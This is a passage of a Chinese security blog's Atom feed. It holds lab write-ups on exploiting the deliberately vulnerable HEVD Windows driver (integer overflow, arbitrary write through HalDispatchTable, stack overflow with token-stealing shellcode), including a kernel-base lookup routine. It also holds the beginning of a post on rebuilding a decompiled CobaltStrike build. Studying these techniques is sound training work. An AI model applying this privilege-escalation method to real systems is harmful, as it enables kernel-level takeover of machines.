<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HaCky的安全备忘录</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://findream.github.io/"/>
  <updated>2022-07-22T12:08:46.026Z</updated>
  <id>https://findream.github.io/</id>
  
  <author>
    <name>HaCky</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HEVD之整数溢出</title>
    <link href="https://findream.github.io/2022/07/22/HEVD%E4%B9%8B%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
    <id>https://findream.github.io/2022/07/22/HEVD之整数溢出/</id>
    <published>2022-07-22T07:02:11.000Z</published>
    <updated>2022-07-22T12:08:46.026Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-成因分析"><a href="#0x01-成因分析" class="headerlink" title="0x01 成因分析"></a>0x01 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;整数包括无符号整数和有符号整数，但是对于计算机来说，区分无符号整数和有符号整数意义不大，比如”-1”,无符号整数来说，其值为<code>4294967295</code>,也就是<code>0xFFFFFFFF</code>,编译器根据数据类型的不同，生成不同的代码，规定了每个数据变量的长度。在自然语义环境中，如果是4294967295加上4，最终会得到4294967299这个数字，但是，在计算机语义中，这个是在这个数据类型中是最大的，加上4就需要向高位拓展。这样就会丢弃拓展的高位。整数溢出就是这样产生的。例如,<code>0xFFFFFFFF</code>加上<code>4</code>之后，得到的数据就是<code>3</code>。</p><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>整数溢出漏洞的作用是什么，整数溢出主要是为了绕过可能的长度检查。</strong>如下的例子，如果输入任意正整数，都不可能使得b+c 小于 a，但是如果输入的c是0xFFFFFFF0，因为整数溢出，0xFFFFFFFA+0x9 = 0x3.如此就绕过了长度检查。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> a = <span class="number">8</span>;</div><div class="line"><span class="keyword">int</span> b = <span class="number">9</span>;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;c);</div><div class="line"><span class="keyword">if</span>(b+c &lt; <span class="number">8</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"success"</span>)</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"failed"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEVD的IntegerOverflow位于TriggerIntegerOverflow函数中，直接通过反汇编看，已知函数栈空间为0x820+0x04=0x824,也就是说要实现栈溢出需要0x824+0x04的大小实现。但是在代码中，对缓冲区长度进行了校验，根据自然语义下理解，缓冲区长度加上4要小于0x800，说明缓冲区不可能超过0x800，这样就不会造成栈溢出。<br>    <img src="http://hacky.wang/blog/20220722/hx8xVjwNx9xf.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是由于整数溢出，当我传入的UserBufferLength为0xFFFFFFFF，加个4，得0x3，这样自然就绕过了大小的限制。</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据分析代码，明确使用栈溢出进行利用，使用整数溢出绕过长度检查。查看代码，要使进行缓冲区复制需要两个条件，Buffer内容不为0xBAD0B0B0，长度小于UserBufferLength/4。在使用整数溢出的是和，第二个条件得到满足，但是前面也说了实现栈溢出需要0x824+0x04的大小的缓冲区，所以，构造的payload主要构成是这样的，0x824长度用于填充缓冲，0x04是提权shellcode的地址，最后四个字节内容为0xBAD0B0B0，用于终止缓冲区复制。<br>    <img src="http://hacky.wang/blog/20220722/V9QyljolQXJA.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-成因分析&quot;&gt;&lt;a href=&quot;#0x01-成因分析&quot; class=&quot;headerlink&quot; title=&quot;0x01 成因分析&quot;&gt;&lt;/a&gt;0x01 成因分析&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;整数包括无符号整数和有符号整数，但是对于计算机来说，区分无符号整数和有符号整数意义不大，比如”-1”,无符号整数来说，其值为&lt;code&gt;4294967295&lt;/code&gt;,也就是&lt;code&gt;0xFFFFFFFF&lt;/code&gt;,编译器根据数据类型的不同，生成不同的代码，规定了每个数据变量的长度。在自然语义环境中，如果是4294967295加上4，最终会得到4294967299这个数字，但是，在计算机语义中，这个是在这个数据类型中是最大的，加上4就需要向高位拓展。这样就会丢弃拓展的高位。整数溢出就是这样产生的。例如,&lt;code&gt;0xFFFFFFFF&lt;/code&gt;加上&lt;code&gt;4&lt;/code&gt;之后，得到的数据就是&lt;code&gt;3&lt;/code&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞挖掘" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
  </entry>
  
  <entry>
    <title>HEVD之任意地址覆盖</title>
    <link href="https://findream.github.io/2022/07/20/HEVD%E4%B9%8B%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%A6%86%E7%9B%96/"/>
    <id>https://findream.github.io/2022/07/20/HEVD之任意地址覆盖/</id>
    <published>2022-07-20T07:02:11.000Z</published>
    <updated>2022-07-22T12:09:00.066Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-成因分析"><a href="#0x01-成因分析" class="headerlink" title="0x01 成因分析"></a>0x01 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;任意地址覆盖，指的是代码没有验证地址是否有效直接使用。通过构造payload，将用来提权的Shellcode的地址覆盖到可以导致内核代码执行的区域从而实现提权。</p><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该漏洞位于HEVD控制码为0x22200B的函数<code>sub_444BCE</code>处,在<code>sub_444BCE</code>函数中，将R3传来的缓冲区传入了<code>sub_444BEE</code>,乍一看，很难发现这段代码有什么问题，就是单纯的将What成员复制给了Where成员，但是在内核中，没有针对地址的有效性进行验证，直接使用的话，这是非常危险的。<br>    <img src="http://hacky.wang/blog/20220720/gglXAaml6Ltv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从源码来看，漏洞版本就是没有对地址进行检查，而修复的版本，可以看到对需要读取的地址，使用ProbeForRead和ProbeForWrite进行了检查，ProbeForRead和ProbeForWrite的作用就是检查用户模式缓冲区是否位于用户态，并验证对齐。<br>    <img src="http://hacky.wang/blog/20220720/EmKALOaM0m6g.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在学习这个漏洞的时候，我一直想不明白，就光一个内存写入怎么就触发漏洞了，后来其实才明白原理，其实内存写入这个动作并不会触发漏洞，关键是写入的这个地址(也就是代码里面的What)才是危险的，我们可以这样构造，首先What这个地方存储的是ShellCode的地址，然后在找一个地方，只要可以执行就好了，因为通过这个任意地址覆盖，将Shellcode的地址覆盖到那个可以执行的地址上，那么通过触发，就可以执行Shellcode了。而<code>HalDispatchTable+0x4</code>就是这样一个地址。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何定位<code>HalDispatchTable+0x4</code>，首先查看一下<code>nt!NtQueryIntervalProfile</code>这个函数的反汇编，在<code>nt!NtQueryIntervalProfile+0x6B</code>调用了<code>nt!KeQueryIntervalProfile</code>,跟进<code>nt!KeQueryIntervalProfile</code>,显然在在<code>0x8410e8b4</code>调用了<code>nt!HalDispatchTable+0x4</code>这个分发表，<strong>只需要记住，shellcode往这个地方写就是了，貌似高版本的系统这个地方已经被缓解了。</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">kd&gt; u nt!NtQueryIntervalProfile+<span class="number">0x6B</span></div><div class="line">nt!NtQueryIntervalProfile+<span class="number">0x6b</span>:</div><div class="line">8414ffa6 e8e6e8fbff      <span class="keyword">call</span>    nt!KeQueryIntervalProfile (8410e891)</div><div class="line">8414ffab 84<span class="built_in">db</span>            <span class="keyword">test</span>    <span class="built_in">bl</span>,<span class="built_in">bl</span></div><div class="line">8414ffad 741b            <span class="keyword">je</span>      nt!NtQueryIntervalProfile+<span class="number">0x8f</span> (8414ffca)</div><div class="line">8414ffaf c745fc01000000  <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">1</span></div><div class="line">8414ffb6 <span class="number">8906</span>            <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>],<span class="built_in">eax</span></div><div class="line">8414ffb8 eb07            <span class="keyword">jmp</span>     nt!NtQueryIntervalProfile+<span class="number">0x86</span> (8414ffc1)</div><div class="line">8414ffba 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">8414ffbc <span class="number">40</span>              <span class="keyword">inc</span>     <span class="built_in">eax</span></div><div class="line">//======&gt;nt!KeQueryIntervalProfile</div><div class="line">kd&gt; U nt!KeQueryIntervalProfile l20</div><div class="line">nt!KeQueryIntervalProfile:</div><div class="line">8410e891 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line">8410e893 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line">8410e894 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">8410e896 83ec10          <span class="keyword">sub</span>     <span class="built_in">esp</span>,<span class="number">10h</span></div><div class="line">8410e899 83f801          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">1</span></div><div class="line">8410e89c <span class="number">7507</span>            <span class="keyword">jne</span>     nt!KeQueryIntervalProfile+<span class="number">0x14</span> (8410e8a5)</div><div class="line">8410e89e a1889afa83      <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [nt!KiProfileAlignmentFixupInterval (83fa9a88)]</div><div class="line">8410e8a3 c9              <span class="keyword">leave</span></div><div class="line">8410e8a4 c3              <span class="keyword">ret</span></div><div class="line">8410e8a5 8945f0          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>],<span class="built_in">eax</span></div><div class="line">8410e8a8 8d45fc          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">4</span>]</div><div class="line">8410e8ab <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">8410e8ac 8d45f0          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">10h</span>]</div><div class="line">8410e8af <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">8410e8b0 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span></div><div class="line">8410e8b2 6a01            <span class="keyword">push</span>    <span class="number">1</span></div><div class="line">8410e8b4 ff15bcf3f683    <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [nt!HalDispatchTable+<span class="number">0x4</span> (83f6f3bc)]</div><div class="line">8410e8ba 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">8410e8bc 7c0b            <span class="keyword">jl</span>      nt!KeQueryIntervalProfile+<span class="number">0x38</span> (8410e8c9)</div><div class="line">8410e8be 807df400        <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>],<span class="number">0</span></div><div class="line">8410e8c2 <span class="number">7405</span>            <span class="keyword">je</span>      nt!KeQueryIntervalProfile+<span class="number">0x38</span> (8410e8c9)</div><div class="line">8410e8c4 8b45f8          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]</div><div class="line">8410e8c7 c9              <span class="keyword">leave</span></div><div class="line">8410e8c8 c3              <span class="keyword">ret</span></div></pre></td></tr></table></figure></p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先第一步打开设备，第二歩就是获取HalDispatchTable+4地址，这个地址用来存放ShellCode。获取<code>获取HalDispatchTable+4</code>地址主要有四步，因为<code>HalDispatchTable</code>这个地址在R3是导出的，只需要获取<code>ntkrnlpa.exe</code>在R3的基地址和R0的基地址，<code>HalDispatchTable</code>在R3的地址，减去<code>ntkrnlpa.exe</code>在R3的基地址，加上R0的基地址就是<code>HalDispatchTable</code>在R0的地址。所以获取<code>HalDispatchTable</code>在R0地址只需要四步。</p><ul><li>获取<code>ntkrnlpa.exe</code>在R0基地址</li><li>通过<code>LoadLibrary</code>获取<code>ntkrnlpa.exe</code>在R3基地址</li><li>通过<code>GetProcAddress</code>获取<code>HalDispatchTable</code>在R3的地址</li><li>计算<code>HalDispatchTable</code>在R0的的地址<br>  <img src="http://hacky.wang/blog/20220720/TCkVreVYvKrV.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中如何获取<code>ntkrnlpa.exe</code>在R0的基地址呢。首先<code>EnumDeviceDrivers</code>获取所有的驱动模块基地址，然后根据基地址，调用<code>GetDeviceDriverBaseNameA</code>获取驱动名，依次比较是否是<code>ntkrnlpa.exe</code>即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function">PVOID <span class="title">GetBaseAddrOfntkrnlpaInKernel</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">//遍历所有的驱动程序基地址</span></div><div class="line">LPVOID lpImageBase[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">DWORD lpcbNeeded = <span class="number">0</span>;</div><div class="line">TCHAR lpfileName[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">EnumDeviceDrivers(lpImageBase, <span class="keyword">sizeof</span>(lpImageBase),&amp;lpcbNeeded);   <span class="comment">//#include&lt;Psapi.h&gt;</span></div><div class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; (lpcbNeeded / <span class="keyword">sizeof</span>(LPVOID)); i++)</div><div class="line">&#123;</div><div class="line">GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(lpfileName, <span class="string">"ntkrnlpa.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+]success to get %s\n"</span>, lpfileName);</div><div class="line"><span class="keyword">return</span> lpImageBase[i];</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步，触发漏洞，将Shellcode地址作为What参数传入，然后将<code>HalDispatchTable+4</code>作为Where传入，因为任意地址覆盖，就可以将Shellcode地址覆盖到<code>HalDispatchTable+4</code>地址，然后只需要调用<code>NtQueryIntervalProfile</code>触发执行就可以了。<code>NtQueryIntervalProfile</code>第一个参数值应该可以任意数字。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-252506.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(3)-任意内存覆盖漏洞</a></li><li><a href="https://bbs.pediy.com/thread-270176.htm" target="_blank" rel="external">HEVD学习笔记之任意地址写入</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-成因分析&quot;&gt;&lt;a href=&quot;#0x01-成因分析&quot; class=&quot;headerlink&quot; title=&quot;0x01 成因分析&quot;&gt;&lt;/a&gt;0x01 成因分析&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;任意地址覆盖，指的是代码没有验证地址是否有效直接使用。通过构造payload，将用来提权的Shellcode的地址覆盖到可以导致内核代码执行的区域从而实现提权。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞挖掘" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
  </entry>
  
  <entry>
    <title>HEVD之栈溢出</title>
    <link href="https://findream.github.io/2022/07/16/HEVD%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>https://findream.github.io/2022/07/16/HEVD之栈溢出漏洞/</id>
    <published>2022-07-16T07:02:11.000Z</published>
    <updated>2022-07-22T12:10:35.671Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-环境安装与HEVD说明"><a href="#0x01-环境安装与HEVD说明" class="headerlink" title="0x01 环境安装与HEVD说明"></a>0x01 环境安装与HEVD说明</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装完VirtualKd和Windbg Preview之后，配置WindbgPreview，首先在启动虚拟机之前，配置Costumer如下：<code>DbgX.Shell.exe /k com:pipe,resets=0,reconnect,port=$(pipename)</code>。然后启动虚拟机可能也运行不起WindbgPreview，如果出现这种情况，先设置<code>WinDbg.exe</code>的路径，然后运行调试器，等Windbg起来后，在勾选到<code>Costumer</code>。</p><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEVD有编译好的SYS文件以及源码，其中编译好的SYS有两个文件夹，<code>secure</code>是已经修复过的SYS，而<code>vulnerable</code>是指存在漏洞的SYS。源码是修复之后的代码。<br>    <img src="http://hacky.wang/blog/20220720/88pOuaHsceok.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;含有漏洞代码主要位于<code>HackSysExtremeVulnerableDriver</code>中的<code>IrpDeviceIoCtlHandler</code>函数中，这个函数包含了HEVD所有的漏洞类型。<br>    <img src="http://hacky.wang/blog/20220720/ABYOW7EY0EiO.png?imageslim" alt="mark"></p><h2 id="0x02-成因分析"><a href="#0x02-成因分析" class="headerlink" title="0x02 成因分析"></a>0x02 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;栈溢出位于HEVD控制码为0x222003的函数处，也就是<code>sub_44517E</code>,很显然，在<code>sub_44517E</code>函数中，将有R3传入的缓冲区，以及该缓冲区的大小传入函数<code>sub_4451A2</code>,在<code>sub_4451A2</code>函数中，并没有对传入的缓冲区大小进行校验，即判断两个缓冲区大小。导致我们传入大于KernelBuffer的大小的UserBuffer，导致栈溢出。<br>    <img src="http://hacky.wang/blog/20220720/4nSgKhHGpCmm.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/LSCnVV4FxHK7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据IDA的解析结果来看，var_1c占了1C大小的空间，KernelBuffer占据了1C-81C共计800h大小的空间，这样子一共占用了81Ch大小的空间，加上返回地址4h的空间，一共占了820h的空间，所以我们构造栈溢出的话，只需要构造820h+4h的空间即可。<br>    <img src="http://hacky.wang/blog/20220720/LeGxgvP8T0ok.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从源码来看，存在漏洞的版本，直接按照UserBuffer大小将UserBuffer复制给KernelBuffer，而修复之后的版本，是按照KernelBuffer大小将UserBuffer复制给KernelBuffer，由此修复了漏洞。<br>    <img src="http://hacky.wang/blog/20220720/ABM8Dt0a3dkC.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>HEVD！TriggerBufferOverflowStack</code>处下断，以及在Buffer复制的地方下断，首先断在<code>HEVD！TriggerBufferOverflowStack</code>开头，查看栈顶寄存器为0x98075bd4，当运行到memcpy处，查看目的地址，也就是第一个参数地址为0x980753b4，两者相减，大小为0x00000820。也就是说，只需要构造一个大小为0x820+0x04的缓冲区，其中前0x820用于覆盖KernelBuffer，最后4个字节用于栈溢出，只需要将提取的shellcode地址放到最后四个字节处就可以实现漏洞利用。<br>    <img src="http://hacky.wang/blog/20220720/oFYFtM7SlLfQ.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/3CHfIoNcpwCb.png?imageslim" alt="mark"></p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，需要打开驱动设备，在没有源码的情况下，在<code>DriverEntry</code>函数中，创建了一个名为<code>\\Device\\HackSysExtremeVulnerableDriver</code>的Device，所以在R3也应该创建<code>\\\\.\\HackSysExtremeVulnerableDriver</code>的Device。<br>    <img src="http://hacky.wang/blog/20220720/m7vPrx9mIecR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，如上所说，应该构造符合条件的Shellcode。具体就是构造一个大小为0x820+0x04的缓冲区，其中前0x820用于覆盖KernelBuffer，最后4个字节用于栈溢出，只需要将提取的shellcode地址放到最后四个字节处就可以实现漏洞利用。<br>    <img src="http://hacky.wang/blog/20220720/OjgBcmXNrzLB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后将payload通过<code>DeviceIoControl</code>传入，Shellcode的原理是通过FS+0x124，获取线程的KTHREAD,然后在通过KTHREAD+0x50获取进程的EPROCESS，然后将当前进程的EPROCESS地址保存在ECX寄存器中。因为EPROCESS是一个链装结构，通过<code>mov eax, [eax + FLINK_OFFSET]</code>这个语句可以定位到下一个EPROCESS链，然后减去0xB8即可定位到EPROCESS结构头。在EPROCESS偏移+0xB4处获取PID，然后和system进程的PID(4)相比，以确定system进程。然后通过0xF8获取system进程token，并将system进程token保存。然后调整栈就可以了。<br>    <img src="http://hacky.wang/blog/20220720/PIoN4NqXKGQ9.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/qjPxVHC365cM.png?imageslim" alt="mark"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-270172.htm" target="_blank" rel="external">HEVD学习笔记之缓冲区溢出攻击</a></li><li><a href="https://bbs.pediy.com/thread-252484.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(2)-内核栈溢出</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-环境安装与HEVD说明&quot;&gt;&lt;a href=&quot;#0x01-环境安装与HEVD说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境安装与HEVD说明&quot;&gt;&lt;/a&gt;0x01 环境安装与HEVD说明&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安装完VirtualKd和Windbg Preview之后，配置WindbgPreview，首先在启动虚拟机之前，配置Costumer如下：&lt;code&gt;DbgX.Shell.exe /k com:pipe,resets=0,reconnect,port=$(pipename)&lt;/code&gt;。然后启动虚拟机可能也运行不起WindbgPreview，如果出现这种情况，先设置&lt;code&gt;WinDbg.exe&lt;/code&gt;的路径，然后运行调试器，等Windbg起来后，在勾选到&lt;code&gt;Costumer&lt;/code&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞挖掘" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike Beacon生成原理分析</title>
    <link href="https://findream.github.io/2022/06/26/CobaltStrike%20Beacon%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/06/26/CobaltStrike Beacon生成原理分析/</id>
    <published>2022-06-26T06:02:11.000Z</published>
    <updated>2022-06-26T08:32:33.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言与背景"><a href="#0x00-前言与背景" class="headerlink" title="0x00 前言与背景"></a>0x00 前言与背景</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文没有什么创新，只是在学习beacon生成和调试分析和检测beacon的过程中的一些记录。</p><h2 id="0x01-二次开发CobaltStrike"><a href="#0x01-二次开发CobaltStrike" class="headerlink" title="0x01 二次开发CobaltStrike"></a>0x01 二次开发CobaltStrike</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我这是在网上找到的一个由鸡哥反编译的一个CobaltStrike4.1版本，所以不在需要重新反编译了。如下是工作目录。<code>decomplie_src</code>是存储着CS反编译的代码，<code>lib目录</code>存储着cobaltstrike4.1.jar文件，作为库文件。<code>out</code>作为编译输出的目录，<code>src</code>存放着所需要的源码文件，也就是<code>decomplie_src</code>源码的子集。这里需要使用的工具是IDEA。<br>    <img src="http://hacky.wang/blog/20220624/JlMIrVX7WosS.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先新建一个项目，设置好项目名和路径之后，在Project下面新建两个目录，<code>decomplie_src</code>和<code>lib</code>目录。<br>    <img src="http://hacky.wang/blog/20220624/180Hr5HH5CL2.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/MW2SFwlDHsvD.png?imageslim" alt="mark"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;把反编译之后的decomplie_src目录里面的所有java文件复制到项目中的<code>decomplie_src</code>,并把cobaltstrike4.1.jar文件放到项目中的<code>lib</code>目录。<br>    <img src="http://hacky.wang/blog/20220624/u5icDjw78qF9.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对项目进行设置，添加模块依赖，在路径<code>File--&gt;Project Structure--&gt;Modules--&gt;Dependencies</code>设置SDK。然后在Dependencies这个页面点一下”+”号，添加jar包，完成后点应用。<br>    <img src="http://hacky.wang/blog/20220624/MlCs7zXcxrgt.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/Njln99Ifj5R0.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;进入<code>Artifacts--&gt;JAR--&gt;From modules with dependencies</code>,设置一个MAIN CLASS为<code>aggressor.Aggressor</code>,这个值可以在<code>MANIFEST.MF</code>文件中查看。完成之后就是这样的结果。<br>    <img src="http://hacky.wang/blog/20220624/J5byFdOSvIlw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/o8DxDDIsJRol.png?imageslim" 